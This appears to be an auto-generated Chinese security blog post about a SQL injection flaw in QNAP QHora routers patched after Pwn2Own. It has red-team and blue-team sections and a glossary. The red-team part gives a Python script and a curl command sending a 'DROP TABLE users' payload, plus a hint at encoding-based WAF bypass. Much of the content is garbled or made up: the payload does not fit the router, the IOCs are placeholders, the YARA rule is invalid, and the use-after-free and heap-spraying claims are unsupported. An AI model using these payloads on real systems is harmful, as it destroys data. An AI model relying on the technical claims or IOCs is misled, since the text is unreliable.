---
layout: post
title:  "威聯通修補Pwn2Own資安競賽揭露的QHora路由器漏洞，可能導致攻擊者執行未授權程式碼"
date:   2026-03-24 12:57:10 +0000
categories: [security]
severity: high
---

# 🔥 解析 QNAP QHora 路由器系列的 SQL 注入漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 分數 7.3)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: SQL 注入, Use-after-free, Heap Spraying

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 漏洞成因是 QHora 路由器系列的 QuRouter 2.6.x 版管理系統中，沒有正確地檢查用戶輸入的 SQL 查詢語句，導致攻擊者可以注入惡意的 SQL 代碼。
* **攻擊流程圖解**: 
    1. 攻擊者輸入惡意的 SQL 查詢語句
    2. QuRouter 2.6.x 版管理系統沒有檢查輸入的 SQL 查詢語句
    3. 惡意的 SQL 代碼被執行
    4. 攻擊者可以執行未授權的程式碼
* **受影響元件**: QHora 路由器系列的 QuRouter 2.6.x 版管理系統

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有管理員帳號和密碼
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義惡意的 SQL 查詢語句
    sql_payload = "SELECT * FROM users WHERE id = 1; DROP TABLE users;"
    
    # 發送 HTTP 請求
    response = requests.post("https://example.com/login", data={"username": "admin", "password": "password", "sql": sql_payload})
    
    # 判斷是否成功注入
    if response.status_code == 200:
        print("SQL 注入成功")
    else:
        print("SQL 注入失敗")
    
    ```
    *範例指令*: 使用 `curl` 工具發送 HTTP 請求

```

bash
curl -X POST -d "username=admin&password=password&sql=SELECT+*+FROM+users+WHERE+id+=+1%3B+DROP+TABLE+users%3B" https://example.com/login

```
* **繞過技術**: 可以使用 WAF 繞過技巧，例如使用 URL 編碼或 Base64 編碼

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /var/www/html/index.php |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule sql_injection {
        meta:
            description = "SQL 注入攻擊"
            author = "John Doe"
        strings:
            $sql_payload = "SELECT * FROM users WHERE id = 1; DROP TABLE users;"
        condition:
            $sql_payload in (http.request.body | http.request.uri)
    }
    
    ```
    或者是具體的 SIEM 查詢語法 (Splunk/Elastic)

```

spl
index=weblogs sourcetype=http_access | search "SELECT * FROM users WHERE id = 1; DROP TABLE users;"

```
* **緩解措施**: 升級到 QuRouter 2.6.3.009 以後版本，並設定 WAF 规则以阻止 SQL 注入攻擊

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SQL 注入 (SQL Injection)**: 想像攻擊者可以注入惡意的 SQL 代碼到資料庫中。技術上是指攻擊者可以注入惡意的 SQL 代碼到應用程式的 SQL 查詢語句中，導致資料庫執行惡意的 SQL 代碼。
* **Use-after-free (UAF)**: 想像攻擊者可以使用已經釋放的記憶體。技術上是指攻擊者可以使用已經釋放的記憶體，導致應用程式執行惡意的程式碼。
* **Heap Spraying**: 想像攻擊者可以在堆疊中填充惡意的程式碼。技術上是指攻擊者可以在堆疊中填充惡意的程式碼，導致應用程式執行惡意的程式碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/174643)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


